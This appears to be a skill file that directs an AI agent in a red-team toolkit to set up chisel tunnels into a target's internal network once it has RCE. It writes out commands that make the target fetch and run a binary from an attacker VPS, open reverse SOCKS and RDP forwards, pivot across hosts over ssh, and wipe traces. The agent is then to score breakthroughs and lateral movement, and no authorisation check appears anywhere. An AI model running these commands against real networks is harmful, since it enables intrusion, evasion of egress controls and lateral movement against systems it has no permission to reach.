---
name: chisel-tunnel
description: Chisel tunnel: HTTP/WebSocket-multiplexed tunneling, easiest to pass outbound restrictions and reverse proxies
whenToUse: When suo5 is not applicable (no webshell entry), the target only allows outbound HTTP, or you need port forwarding or a stable SOCKS tunnel
role: internal
enabled: true
---

# chisel (HTTP tunnel / port forwarding)

> **Load VPS configuration first**: all `$REDTEAM_VPS_HOST` / `$VPS_USER` values in this skill come from local configuration,
> written to `$DSH_HOME/.env` on first run by `bash $DSH_HOME/redteam/setup.sh`. Source it once before each command:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> If not configured yet, run `setup.sh` once (skill `redteam-setup`); it also verifies SSH connectivity and the payload service.

`chisel` encapsulates TCP traffic in **HTTP/WebSocket**, so it is **easiest to pass through outbound policies and reverse proxies that only allow 80/443**.
Division of labor with suo5:

| | suo5 | chisel |
| --- | --- | --- |
| Entry prerequisite | **Requires a webshell** (HTTP channel) | **Only requires command execution** (can run a binary) |
| Transport | HTTP long connection (disguised as normal requests) | HTTP/WebSocket (upgrade) |
| Strengths | Enter the intranet from a web entry; user can reuse it | Enter the intranet from shell/RCE entry; flexible port forwarding |
| Noise | Low (looks like normal web traffic) | Low–medium (WebSocket signature is more visible) |

**Selection rule**: if you have a webshell → prefer `suo5-tunnel`; if you only have command execution/RCE or need precise port forwarding → use chisel.

## Local binaries

| File | Path |
| --- | --- |
| chisel (Linux amd64, same binary for server and client) | `$DSH_HOME/redteam/toolkit/chisel/chisel` (v1.12.0) |

Already synced to the VPS payload directory: `http://$REDTEAM_VPS_HOST:9100/` (target can pull it directly with `curl`).

## 1. Reverse SOCKS (most common: target connects to us)

```bash
# 1) Start server on our VPS (run in tmux to avoid SSH disconnect killing it)
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  allow client to register reverse tunnels
#    --socks5   enable built-in SOCKS5 (usable on VPS after client connects)
#    Optional hardening: --auth user:pass   add authentication to avoid open use if scanned
#    Optional disguise: --backend http://127.0.0.1:80  forward web traffic to a local site

# 2) Start client on target (run via existing RCE/command execution point; pull binary first)
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = reverse SOCKS; after connection, VPS port 1080 becomes the intranet SOCKS5 entry

# 3) Access intranet from local machine through VPS SOCKS
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    runs/proxychains-1080.conf should contain: socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ Do not modify system /etc/proxychains4.conf; use -f to point to a temp config under runs/
```

## 2. Reverse port forwarding (map an intranet port out)

```bash
# Target side: map intranet 10.0.0.5:3389 to VPS 13389
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# Local side: connect directly to VPS:13389 as intranet 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 3. Forward SOCKS (target can connect to us directly, but we need to reach target intranet)

```bash
# Start server on target
/tmp/c server -p 9443 --socks5
# Start client on our side for local forwarding
chisel client <target>:9443 1080:socks
# Then point proxychains to 127.0.0.1:1080
```

## 4. Multi-hop / chaining

```bash
# Tunnel A already exists (suo5 → 127.0.0.1:1080); start chisel on intranet host B through A
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# Expand reachable range layer by layer; register tunnel and reachable segments for each layer
```

## 5. Discipline and safety

1. **Must run in tmux / nohup**: if the session drops, the tunnel is lost (`nohup ... &` or `tmux`).
2. **Add authentication on the server**: chisel servers on public VPSes get port-scanned; add `--auth user:pass` and `pkill` it when done.
3. **Port selection**: avoid 80/443 (may be occupied by other services on the VPS); use high ports like 9443/8443; **open the VPS security group**.
4. **Clean traces and files on the target**: `/tmp/c` can be deleted when done; avoid placing binaries in obviously suspicious paths.
5. **Do not pass off a proxy on your own VPS as a "breakthrough"**: tunnel registration `entry_kind` must clearly describe the target-side endpoint (see below).

## 6. Output and recording (required)

1. **Register tunnel with `redteam_tunnel_add`**; all fields must be filled:
   - `kind`: `chisel`;
   - `listen`: **actual listening address the user can use** (e.g. `$REDTEAM_VPS_HOST:1080` or `127.0.0.1:1080`);
   - `entry`: target-side entry (e.g. `/tmp/c client on 10.0.0.6 → VPS:9443`);
   - `reach`: **reachable network segments** (e.g. `10.0.0.0/24`, fill only after verification, do not guess);
   - `entry_kind`: **must be `target-outbound`** (target callback / chisel client running on target) or
     `target-http` (via target webshell), `target-agent` (via controlled target process);
     ⛔ filling `self-only` for a proxy opened only on your own VPS **will be marked as "not a breakthrough"**;
   - `command`: full command text (include both server and client segments).
2. **Verify connectivity**: `curl --socks5-hostname <listen> http://<intranet-target>/` or `proxychains4 -f ... curl ...`;
   only count the tunnel as established after it works; then write back status with `redteam_session_check`.
3. **Scoring**: tunnel reaches intranet → `redteam_score_hit` (`boundary`, evidence should state "tunnel address | reachable segment | intranet target actually accessed");
   lateral movement to other hosts through it → `server-host`.
4. **Deliver to user**: provide a paste-ready configuration—`socks5://<listen>` (or how to map to the user's machine via `ssh -D` / frp),
   clearly state listening address and port, and explain that the tunnel crosses the target boundary.
5. For each key action, add `redteam_chain_add` (`stage_code=boundary-logical`), put the command text in `tool` and output summary in `result`.
